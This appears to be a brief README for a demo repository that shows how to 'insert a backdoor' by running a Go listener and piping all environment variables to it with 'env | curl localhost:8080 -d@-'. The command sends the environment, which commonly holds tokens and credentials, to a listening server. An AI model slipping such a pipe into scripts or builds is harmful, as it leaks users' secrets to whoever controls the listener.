# env | curl

Simple example of how to insert a backdoor into anything that can run a script and has external network access.

## How to Run

Run the server to listed for any request and dump the request body to stdout:

`go run main.go`

Pipe the env to curl and make a request containing the env in its body:

`env | curl localhost:8080 -d@-`
